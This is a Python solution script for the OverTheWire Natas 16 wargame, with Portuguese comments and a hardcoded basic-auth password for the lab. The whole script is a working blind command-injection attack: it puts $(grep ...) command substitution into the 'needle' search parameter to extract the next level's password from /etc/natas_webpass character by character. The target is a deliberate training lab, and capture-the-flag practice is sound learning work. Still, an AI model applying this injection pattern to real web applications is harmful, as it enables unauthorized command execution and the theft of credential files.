import requests
import string
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

# Configuração inicial
basicAuth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
base_url = "http://natas16.natas.labs.overthewire.org/"
valid_chars = string.digits + string.ascii_letters

matching_chars = ""

url = base_url + '?needle=%24%28grep+n+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'

response = requests.get(url, auth=basicAuth, verify=True)



if response.status_code == 200:

    soup = BeautifulSoup(response.content, 'html.parser')

    content_pre = soup.select_one('#content > pre')
    arq = []
    if content_pre:
        data = content_pre.get_text()
       
        for dd in data.split():
            print("Trying digit:", dd)



                
            for char in valid_chars:
                payload = f'$(grep {char} /etc/natas_webpass/natas17){dd}'
                urls = base_url + "?needle=" + payload + "&submit=Search"

                # Faz a requisição
                response = requests.get(urls, auth=basicAuth, verify=True)  # Certifique-se de configurar SSL adequadamente

                #Verifica se o padrão 'zigzag' não está presente na resposta
                if dd not in response.text:
                    print("Found a valid char: {}".format(char))
                    matching_chars += char
            if len(matching_chars) == 32:
                print("Found all chars:", matching_chars)
                break
           
        
        
       
    else:
        print("Tag <pre> não encontrada dentro do id 'content'.")
else:
    print(f"Erro ao fazer a requisição: {response.status_code}")

# Itera sobre os caracteres válidos

